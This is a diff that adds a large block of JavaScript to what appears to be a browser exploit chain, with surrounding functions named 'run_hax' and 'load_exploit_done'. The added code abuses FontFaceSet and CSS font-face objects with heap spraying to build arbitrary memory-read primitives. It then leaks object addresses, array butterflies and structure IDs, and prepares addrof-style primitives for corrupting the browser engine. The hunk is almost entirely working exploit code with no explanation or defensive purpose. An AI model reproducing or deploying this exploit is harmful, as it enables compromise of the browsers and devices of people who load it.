@@ -678,6 +678,105 @@ function run_hax() {
     load_exploit_done(); 
     }
 }
+function makeReader(read_addr, ffs_name) {
+var fake_s = '';
+fake_s += '0000';
+fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff';
+fake_s += ptrToString(read_addr);
+fake_s += ptrToString(0x80000014);
+p_s = '';
+p_s += ptrToString(29);
+p_s += ptrToString(guessed_addr);
+p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
+for (var i = 0; i < 18; i++)
+p_s += ptrToString(INVALID_POINTER);
+for (var i = 0; i < 256; i++)
+mkString(HASHMAP_BUCKET, p_s);
+var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
+mkString(HASHMAP_BUCKET, p_s);
+var relative_read = mkString(HASHMAP_BUCKET, fake_s);
+bad_fonts[guessed_font].family = ffs_name + "_evil1";
+bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
+bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
+needfix.push(relative_read);
+if (relative_read.length < 1000)
+return makeReader(read_addr, ffs_name + '_');
+return relative_read;
+}
+var fastmalloc = makeReader(leak, 'ffs3');
+for (var i = 0; i < 100000; i++)
+mkString(128, '');
+var props = [];
+for (var i = 0; i < 0x10000; i++) {
+props.push({
+value: 0x41434442
+});
+props.push({
+value: jsvalue
+});
+}
+var jsvalue_leak = null;
+while (jsvalue_leak === null) {
+Object.defineProperties({}, props);
+for (var i = 0;; i++) {
+if (fastmalloc.charCodeAt(i) == 0x42 &&
+fastmalloc.charCodeAt(i + 1) == 0x44 &&
+fastmalloc.charCodeAt(i + 2) == 0x43 &&
+fastmalloc.charCodeAt(i + 3) == 0x41 &&
+fastmalloc.charCodeAt(i + 4) == 0 &&
+fastmalloc.charCodeAt(i + 5) == 0 &&
+fastmalloc.charCodeAt(i + 6) == 254 &&
+fastmalloc.charCodeAt(i + 7) == 255 &&
+fastmalloc.charCodeAt(i + 24) == 14
+) {
+jsvalue_leak = stringToPtr(fastmalloc, i + 32);
+break;
+}
+}
+}
+var rd_leak = makeReader(jsvalue_leak, 'ffs4');
+var array256 = stringToPtr(rd_leak, 16);
+var ui32a = stringToPtr(rd_leak, 24);
+var rd_arr = makeReader(array256, 'ffs5');
+var butterfly = stringToPtr(rd_arr, 8);
+var rd_ui32 = makeReader(ui32a, 'ffs6');
+for (var i = 0; i < 8; i++)
+union_b[i] = rd_ui32.charCodeAt(i);
+var structureid_low = union_i[0];
+var structureid_high = union_i[1];
+union_i[0] = 0x10000;
+union_i[1] = 0;
+arrays[257][1] = {};
+arrays[257][0] = union_f[0];
+union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
+union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
+arrays[256][i] = union_f[0];
+pp_s = '';
+pp_s += ptrToString(56);
+for (var i = 0; i < 12; i++)
+pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
+var fake_s = '';
+fake_s += '0000';
+fake_s += ptrToString(INVALID_POINTER);
+fake_s += ptrToString(butterfly);
+fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';
+var ffs7_args = [];
+for (var i = 0; i < 12; i++)
+ffs7_args.push(bad_fonts[guessed_font + i]);
+ffs7_args.push(good_font);
+var ffs8_args = [bad_fonts[guessed_font + 12]];
+for (var i = 0; i < 5; i++)
+ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
+for (var i = 0; i < HAMMER_NSTRINGS; i++)
+mkString(HASHMAP_BUCKET, pp_s);
+ffses.ffs7 = new FontFaceSet(ffs7_args);
+mkString(HASHMAP_BUCKET, pp_s);
+ffses.ffs8 = new FontFaceSet(ffs8_args);
+var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
+needfix.push(post_ffs);
+for (var i = 0; i < 13; i++)
+bad_fonts[guessed_font + i].family = "hammer" + i;
 function boot_addrof(obj) {
 arrays[257][32] = obj;
 union_f[0] = arrays[258][0];
